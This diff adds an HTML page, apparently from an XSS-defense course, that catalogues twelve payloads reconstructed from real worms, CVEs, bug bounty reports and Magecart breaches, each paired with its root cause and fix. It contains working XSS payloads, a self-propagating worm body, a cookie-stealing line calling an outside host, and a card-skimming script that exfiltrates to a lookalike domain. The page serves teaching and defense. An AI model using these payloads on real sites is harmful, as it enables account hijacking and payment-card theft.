@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 10 — Real-World Derived Payloads</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-cve{background:#2a0000;color:var(--danger)}
+  .t-bb{background:#1a1500;color:var(--warn)}
+  .t-worm{background:#001a0d;color:var(--ok)}
+  .t-research{background:#0d1a30;color:var(--accent)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>10 — Real-World Derived Payloads</h1>
+<div class="sub">12 payloads reconstructed from CVEs, bug bounty reports, and famous worms · Module reference: M16</div>
+
+<div class="section-label">A. Worm-Derived Payloads</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-worm">SAMY WORM</span><span class="tag t-worm">MySpace 2005</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* Samy Worm — simplified reconstruction (Samy Kamkar, 2005) */
+/* Original bypassed MySpace's filter using CSS expression() in IE and java\nscript keyword split */
+
+/* Modern equivalent of the propagation logic: */
+&lt;img src=x onerror="
+(function(){
+  var x=new XMLHttpRequest();
+  x.open('GET','/profile/edit',true);
+  x.onload=function(){
+    /* extract CSRF token */
+    var t=(x.responseText.match(/token.*?value=['\"]([\w]+)/)||[])[1]||'';
+    var payload='&lt;img src=x onerror=WORM_PAYLOAD&gt;';
+    var body='csrf='+t+'&amp;hero=samy&amp;bio='+encodeURIComponent(payload);
+    var y=new XMLHttpRequest();
+    y.open('POST','/profile/update',true);
+    y.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    y.send(body);
+  };
+  x.send();
+})()
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Origin</span><span class="meta-val">Samy Kamkar's MySpace XSS worm, October 2005. Spread to 1 million profiles in ~20 hours.</span>
+    <span class="meta-key">Original bypass</span><span class="meta-val">CSS <code>background:url('java\nscript:...')</code> in IE; keyword "javascript" split across line boundary to bypass string filter; MySpace's filter matched exact string "javascript"</span>
+    <span class="meta-key">Missing defense</span><span class="meta-val bypasses">Output encoding on bio/hero fields; recursive keyword filter; rate limiting on profile updates</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Output encoding (html.escape) on profile display; CSP; rate limiting POST /profile/update</span>
+    <span class="meta-key">What stopped it</span><span class="meta-val">MySpace took the site offline, deleted infected profiles, and patched the encoding. Samy pled guilty to CFAA charges.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-worm">TWITTER WORM</span><span class="tag t-worm">2010</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* Twitter onMouseOver worm, September 21 2010 */
+/* The actual tweet text that was injected: */
+onmouseover=".open('http://twit.ac/'+location.hash+'?'+document.cookie)"
+
+/* How it looked in HTML after Twitter failed to encode it: */
+&lt;span class="tweet-text" onmouseover="..."&gt;@user [tweet text] onmouseover="[payload]"&lt;/span&gt;
+
+/* Self-retweeting variant that propagated: */
+onmouseover="document.getElementById('status').value=
+  'RT: '+this.textContent;
+  document.forms[0].submit()"
+
+/* Full-screen coverage trick to make it near-certain to fire: */
+&lt;span style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999"
+      onmousemove="/* payload */"&gt;&lt;/span&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Origin</span><span class="meta-val">Multiple Twitter users discovered that tweet text was reflected unencoded into HTML attributes. Tens of thousands of infected tweets within hours.</span>
+    <span class="meta-key">Root cause</span><span class="meta-val bypasses">Output encoding failure in tweet rendering — tweet text inserted into HTML context without escaping</span>
+    <span class="meta-key">Self-propagation</span><span class="meta-val">Payload auto-retweeted itself using the tweet form; every viewer became a spreader on mouse hover</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Output encoding on tweet display (fixed within hours); CSP; event handler sanitization</span>
+    <span class="meta-key">Impact</span><span class="meta-val">Popups, redirects to NSFW sites, mass DMs. Twitter fixed within hours but the technique spread across multiple simultaneous exploiters.</span>
+  </div>
+</div>
+
+<div class="section-label">B. CVE-Derived Payloads</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-cve">CVE-2020-11022</span><span class="tag t-cve">jQuery</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* CVE-2020-11022/11023 — jQuery &lt; 3.5.0 XSS via HTML manipulation */
+/* Affected: $.html(), $.append(), $.prepend(), etc. when passed HTML strings */
+
+/* Vulnerability: passing HTML with leading whitespace + selector to $() */
+$('&lt;option&gt;&lt;/option&gt;').html('&lt;img src=x onerror=alert(1)&gt;');
+/* or via $.append with crafted input: */
+$('body').append('&lt;script&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;');
+
+/* Fix: jQuery 3.5.0 changed HTML parsing to strip dangerous patterns */
+/* Affected jQuery versions: 1.0 - 3.4.x (basically everything old) */
+/* Impact: any site using $().html($userInput) with jQuery &lt; 3.5 */</div>
+  <div class="meta">
+    <span class="meta-key">CVE</span><span class="meta-val">CVE-2020-11022 and CVE-2020-11023</span>
+    <span class="meta-key">Affected</span><span class="meta-val">jQuery 1.2.0 – 3.4.1 — an enormous percentage of the web</span>
+    <span class="meta-key">Root cause</span><span class="meta-val bypasses">jQuery's HTML manipulation methods parsed arbitrary HTML including scripts when passed strings containing &lt;script&gt; tags in specific positions</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">jQuery ≥ 3.5.0; never passing user input to $().html() or similar jQuery HTML methods; DOMPurify before passing to jQuery</span>
+    <span class="meta-key">Lesson</span><span class="meta-val">A library function is a sink just like innerHTML. Passing user-controlled HTML to any jQuery manipulation method is equivalent to assigning to innerHTML.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-cve">CVE-2019-11358</span><span class="tag t-cve">jQuery PP</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* CVE-2019-11358 — jQuery prototype pollution via $.extend(true, ...) */
+/* jQuery &lt; 3.4.0 */
+
+var malicious = JSON.parse('{"__proto__":{"polluted":"yes"}}');
+$.extend(true, {}, malicious);
+console.log({}.polluted); // "yes" — Object.prototype polluted
+
+/* XSS chain: poll Object.prototype.innerHTML, find jQuery gadget that reads it */
+var payload = JSON.parse('{"__proto__":{"innerHTML":"&lt;img src=x onerror=alert(1)&gt;"}}');
+$.extend(true, {}, payload);
+/* Any jQuery code that does $(element).html(config.innerHTML) where config = {} now fires */</div>
+  <div class="meta">
+    <span class="meta-key">CVE</span><span class="meta-val">CVE-2019-11358 — CVSS 6.1 Medium</span>
+    <span class="meta-key">Affected</span><span class="meta-val">jQuery &lt; 3.4.0. Patched by adding key check: if key === '__proto__' skip</span>
+    <span class="meta-key">Root cause</span><span class="meta-val bypasses">$.extend(true, …) deep merge processed __proto__ as a normal object key, writing to Object.prototype</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">jQuery ≥ 3.4.0; Object.freeze(Object.prototype); Trusted Types</span>
+    <span class="meta-key">Lesson</span><span class="meta-val">Prototype pollution in a library you didn't write, exploited by a gadget elsewhere in your app. You may not have touched either file. This is the class of vulnerability that requires defense-in-depth.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-cve">CVE-2021-21224</span><span class="tag t-cve">V8/Chrome</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* CVE-2021-21224 — V8 type confusion, exploited in the wild April 2021 */
+/* This was a browser engine vulnerability, not an XSS payload per se */
+/* Included here as an example of what a browser 0-day looks like in the wild */
+
+/* The trigger pattern (simplified, not functional): */
+/* Type confusion in V8's handling of 32-bit integer operations */
+/* An attacker-controlled web page could trigger arbitrary code execution */
+/* in the renderer process without any user interaction beyond visiting the page */
+
+/* Real-world delivery: */
+/* Embedded in iframe on compromised ad network → served to millions */
+/* No XSS injection point needed — the browser itself was the vulnerability */
+
+/* Defense: browser updates. For web developers: */
+/* - Enable Strict-Transport-Security to prevent HTTP downgrade */
+/* - Use Cross-Origin-Opener-Policy / Cross-Origin-Embedder-Policy for isolation */
+/* - Reduce attack surface: disable JS where not needed */</div>
+  <div class="meta">
+    <span class="meta-key">CVE</span><span class="meta-val">CVE-2021-21224 — exploited in the wild, patched in Chrome 90.0.4430.85</span>
+    <span class="meta-key">Why included</span><span class="meta-val">Browser 0-days represent the threat model beyond XSS — when the browser engine itself is compromised, origin isolation (COOP/COEP) becomes the last defense</span>
+    <span class="meta-key">Defense</span><span class="meta-val stopped">Keep browsers updated; COOP/COEP headers for origin isolation; Site Isolation (Spectre mitigations)</span>
+    <span class="meta-key">PhD angle</span><span class="meta-val">Browser engine vulnerabilities vs. web application vulnerabilities — different attack surfaces, different defenses. A PhD in XSS defenses must acknowledge the browser engine layer as out-of-scope but acknowledge its existence.</span>
+  </div>
+</div>
+
+<div class="section-label">C. Bug Bounty Report Patterns</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-bb">BUG BOUNTY</span><span class="tag t-bb">REFLECTED XSS</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* Common bug bounty pattern: search box XSS */
+/* Endpoint: /search?q=USER_INPUT → reflected unencoded in: */
+/*   &lt;input type="text" value="USER_INPUT"&gt; */
+
+/* Breaking out of attribute context: */
+" autofocus onfocus=alert(document.domain) x="
+
+/* Result in HTML: */
+&lt;input type="text" value="" autofocus onfocus=alert(document.domain) x=""&gt;
+
+/* Alternative — break out entirely: */
+"&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;"
+
+/* No angle brackets needed for handler injection: */
+" onmouseover="alert(1)</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Search form — user input reflected into value="" attribute</span>
+    <span class="meta-key">Pattern</span><span class="meta-val">M08 attribute injection — break out of attribute with " then inject event handler</span>
+    <span class="meta-key">Impact</span><span class="meta-val">P1 in most bug bounty programs when on authenticated pages; P2 on unauthenticated</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Output encoding inside attribute: <code>html.escape()</code> converts <code>"</code> to <code>&amp;quot;</code> — prevents attribute escape</span>
+    <span class="meta-key">Note</span><span class="meta-val">This is the most common real-world XSS pattern. Search boxes reflect the query into the page for display. The fix is a single line: <code>html.escape(q)</code> before insertion. The autofocus+onfocus variant fires immediately without any user interaction.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-bb">BUG BOUNTY</span><span class="tag t-bb">STORED XSS</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* Common stored XSS: display name / username field */
+/* Attacker sets their display name to: */
+&lt;img src=x onerror=alert(document.domain)&gt;
+
+/* This fires when any other user sees the attacker's name displayed:
+   - in comments they wrote
+   - in @ mentions
+   - in friend/follower lists
+   - in admin panels showing user lists
+   - in emails/notifications showing the name */
+
+/* High-value target: the admin panel display */
+/* If an admin ever views a page with the attacker's name → admin-context XSS */
+/* Admin has elevated permissions → CSRF token for privileged actions → escalation */</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">User profile display name — stored in DB, reflected in multiple views</span>
+    <span class="meta-key">Impact</span><span class="meta-val">Affects every user who sees the display name; admin-context execution if admins view user lists</span>
+    <span class="meta-key">Why it's commonly missed</span><span class="meta-val bypasses">The input form may sanitize, but the display contexts may be different endpoints. Bug: sanitize on input, not encode on output.</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Output encoding at every display point; template auto-escaping (Django, Jinja2, Rails all escape by default — the bug is when developers explicitly mark output as safe)</span>
+    <span class="meta-key">Note</span><span class="meta-val">The "mark as safe" pattern is the most common real-world stored XSS cause. Framework escapes by default. Developer marks output as "safe" or uses innerHTML or |safe filter — usually after doing their own (insufficient) sanitization. Output encoding by default + explicit opt-out at known-safe points.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-bb">BUG BOUNTY</span><span class="tag t-bb">DOM XSS</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* Common bug bounty DOM XSS: error message via URL parameter */
+/* App code: */
+const msg = new URLSearchParams(location.search).get('error');
+if (msg) {
+  document.getElementById('flash').innerHTML = '&lt;div class="error"&gt;' + msg + '&lt;/div&gt;';
+}
+
+/* Attack URL: */
+/* /login?error=&lt;img src=x onerror=alert(document.domain)&gt; */
+
+/* Server never touches this — /login?error= is passed to the client */
+/* reflected XSS scanners targeting server responses miss this entirely */
+/* Requires JavaScript-enabled DOM XSS scanner (DOM Invader, Burp DOM scanner) */</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Login page flash message from URL parameter → innerHTML</span>
+    <span class="meta-key">Why common</span><span class="meta-val">Server redirects to /login?error=Invalid+credentials after failed login. Devs put the error in the URL, display it via innerHTML — classic DOM XSS pattern</span>
+    <span class="meta-key">Detection</span><span class="meta-val">Standard scanners miss this — must use DOM XSS scanner or manual review of client-side code</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">textContent instead of innerHTML; DOMPurify; Trusted Types</span>
+    <span class="meta-key">Note</span><span class="meta-val">Found in major platforms regularly. The fix is one word: change innerHTML to textContent. The error message is plain text — it never needs to be HTML. This is the most actionable single fix in DOM XSS: if you're displaying user-controlled text, use textContent.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Magecart / Supply Chain Patterns</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-cve">MAGECART</span><span class="tag t-cve">British Airways 2018</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* British Airways Magecart skimmer — reconstructed from RiskIQ analysis */
+/* 22 lines injected into Modernizr-like utility script on ba.com */
+
+(function() {
+  /* Wait for form submit */
+  document.querySelector('[name="paymentForm"]')
+    .addEventListener('submit', function() {
+      /* Harvest all form fields */
+      var formData = {
+        name:    document.querySelector('[name="cardName"]')    ? document.querySelector('[name="cardName"]').value : '',
+        number:  document.querySelector('[name="cardNumber"]')  ? document.querySelector('[name="cardNumber"]').value : '',
+        expiry:  document.querySelector('[name="expiryMonth"]') ? document.querySelector('[name="expiryMonth"]').value + '/' + document.querySelector('[name="expiryYear"]').value : '',
+        cvv:     document.querySelector('[name="cvvNumber"]')   ? document.querySelector('[name="cvvNumber"]').value : '',
+        email:   document.querySelector('[name="email"]')       ? document.querySelector('[name="email"]').value : '',
+        origin:  location.href
+      };
+      /* Exfiltrate to lookalike domain */
+      new Image().src = 'https://baways.com/gateway/v1/cdn?' + Object.keys(formData)
+        .map(k =&gt; encodeURIComponent(k) + '=' + encodeURIComponent(formData[k]))
+        .join('&amp;');
+      /* Don't cancel submit — real transaction proceeds, victim unaware */
+    });
+})();</div>
+  <div class="meta">
+    <span class="meta-key">Origin</span><span class="meta-val">British Airways breach, August–September 2018. ~500,000 customers' card details stolen. Attacker compromised a JavaScript utility file on BA's CDN.</span>
+    <span class="meta-key">Attack type</span><span class="meta-val">Supply chain XSS — injected into a trusted third-party script (not BA's own code)</span>
+    <span class="meta-key">Ran undetected for</span><span class="meta-val">15 days. No BA-side monitoring detected the outbound traffic to baways.com.</span>
+    <span class="meta-key">Missing defenses</span><span class="meta-val bypasses">SRI on the compromised script; CSP connect-src blocking baways.com; outbound traffic monitoring; integrity checking of deployed JS files</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped"><code>integrity="sha256-..."</code> on the script tag; CSP <code>connect-src 'self' https://ba.com</code> blocking the exfil image request; outbound DNS/HTTP monitoring</span>
+    <span class="meta-key">Fine</span><span class="meta-val">ICO fined British Airways £20 million under GDPR (reduced from £183M initial notice).</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-cve">MAGECART</span><span class="tag t-cve">Ticketmaster 2018</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* Ticketmaster Magecart — Inbenta chat widget compromise */
+/* Attacker compromised Inbenta Technologies, a chat support provider */
+/* The compromise affected only Ticketmaster UK — Inbenta served custom JS per customer */
+
+/* The compromised chat widget loaded: */
+&lt;script src="https://inbenta.ticketmaster.com/embed.js"&gt;&lt;/script&gt;
+/* ↑ Same-origin for Ticketmaster UK. Once inbenta served malicious JS: */
+/* The script had full same-origin access to the Ticketmaster payment page */
+
+/* Pattern: third-party widget → compromised → payment page access */
+/* Same skimmer structure as BA: listen for form submit → harvest card data → exfil */
+
+/* The key difference from BA: */
+/* Ticketmaster used a SUBDOMAIN of their domain for the third-party script */
+/* (inbenta.ticketmaster.com) — this made the script same-origin with the payment page */
+/* If served from inbenta.com (third-party domain) under different CSP it would be cross-origin */</div>
+  <div class="meta">
+    <span class="meta-key">Origin</span><span class="meta-val">Ticketmaster UK breach, April–June 2018. Discovered by RiskIQ. ~40,000 customers affected.</span>
+    <span class="meta-key">Critical detail</span><span class="meta-val">The chat widget was hosted at <code>inbenta.ticketmaster.com</code> — a subdomain of ticketmaster.com — making it same-origin with the payment page. External CDN scripts on subdomains of your domain are same-origin.</span>
+    <span class="meta-key">Missing defenses</span><span class="meta-val bypasses">SRI on the Inbenta script; subresource integrity monitoring; third-party script auditing; CSP connect-src; CSP report-uri for anomaly detection</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Never serving third-party scripts from your own subdomain; SRI; CSP; third-party JS security audit</span>
+    <span class="meta-key">PhD angle</span><span class="meta-val">The subdomain hosting decision is the critical architectural mistake. Security architects should mandate that third-party scripts are served from third-party domains — never from subdomains of the main domain.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-research">RESEARCH</span><span class="tag t-bb">DOM XSS AUDIT</span></div>
+    <span class="entry-num">11</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* Google XSS game payload patterns — educational reconstructions */
+/* from the XSS challenges at xss-game.appspot.com */
+
+/* Level 1 — script tag in body: */
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+/* Level 2 — innerHTML sink: */
+&lt;img src=x onerror=alert(1)&gt;
+
+/* Level 3 — URL fragment to img src (number3.html#1): */
+' onerror='alert(1)
+/* Injected into: &lt;img src='/static/level3/cloud' + num + '.jpg'&gt; */
+
+/* Level 4 — onload timer injection: */
+3');alert('1  /* into: startTimer('USER_INPUT') */
+
+/* Level 5 — javascript: in next= redirect: */
+javascript:alert(1)
+
+/* Level 6 — external script gadget via hash: */
+https://storage.googleapis.com/google-code-archive-downloads/v2/
+code.google.com/browsersec/XSS_Lessons_Learned.pdf
+/* (Load external JS via hash → filters checking for .js extension only) */</div>
+  <div class="meta">
+    <span class="meta-key">Origin</span><span class="meta-val">Google XSS Game — educational XSS challenge created by Google to teach XSS concepts</span>
+    <span class="meta-key">Value</span><span class="meta-val">Each level demonstrates a different injection context. Level 3 is particularly important: the injection is into a JS string inside a src attribute — three contexts nested.</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Each level has a specific fix — the game's purpose is to teach what those fixes are</span>
+    <span class="meta-key">Note</span><span class="meta-val">The XSS game is an excellent supplement to this course. Each level requires a different payload strategy because the injection context changes. Highly recommended as a structured exercise.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-research">RESEARCH</span><span class="tag t-cve">DOMPurify BYPASS</span></div>
+    <span class="entry-num">12</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+/* DOMPurify bypass — CVE-2019-20374 (fixed in 2.0.1) */
+/* Researcher: Michał Bentkowski (Securitum) */
+
+/* The bypass (simplified): */
+&lt;math&gt;&lt;mtext&gt;
+  &lt;table&gt;&lt;mglyph&gt;
+    &lt;style&gt;&lt;/style&gt;
+  &lt;/mglyph&gt;&lt;/table&gt;
+&lt;/mtext&gt;&lt;/math&gt;
+&lt;img src=x onerror=alert(1)&gt;
+
+/* Why it worked: DOMPurify serialized the sanitized DOM to HTML.
+   The serialization produced a string that, when re-parsed via innerHTML,
+   produced a different DOM tree with the img tag active.
+   This is the definition of mXSS — the sanitizer was correct about what IT parsed.
+   The browser's re-parse produced something different. */
+
+/* Timeline: reported Dec 2019, patched in DOMPurify 2.0.1 Jan 2020 */
+/* Lesson: even the best sanitizers can have mXSS vulnerabilities.
+   Keep DOMPurify updated. SRI-pin the version you're using. */</div>
+  <div class="meta">
+    <span class="meta-key">CVE</span><span class="meta-val">CVE-2019-20374 — DOMPurify &lt; 2.0.1</span>
+    <span class="meta-key">Research</span><span class="meta-val">Michał Bentkowski, Securitum. Full write-up at research.securitum.com</span>
+    <span class="meta-key">Root cause</span><span class="meta-val bypasses">MathML mglyph element creates a context where style is raw text; serialization + re-parse in innerHTML produces different DOM (mXSS)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify ≥ 2.0.1; CSP; Trusted Types (if policy uses the patched DOMPurify)</span>
+    <span class="meta-key">PhD angle</span><span class="meta-val">This is the canonical example of Gap 1 from M18 — there is no formal, complete model of safe sanitization. DOMPurify is empirically excellent but not provably complete. The mXSS bypass was in production for an unknown period before discovery. A formal grammar-theoretic proof of sanitizer completeness would be a significant contribution.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="09_exotic_modern.html">← 09: Exotic &amp; Modern</a>
+  <a href="../payload_bank.html">← Payload Bank Index</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => { btn.textContent = 'copied!'; setTimeout(() => btn.textContent = 'copy', 1500); });
+});
+</script>
+</body>
+</html>
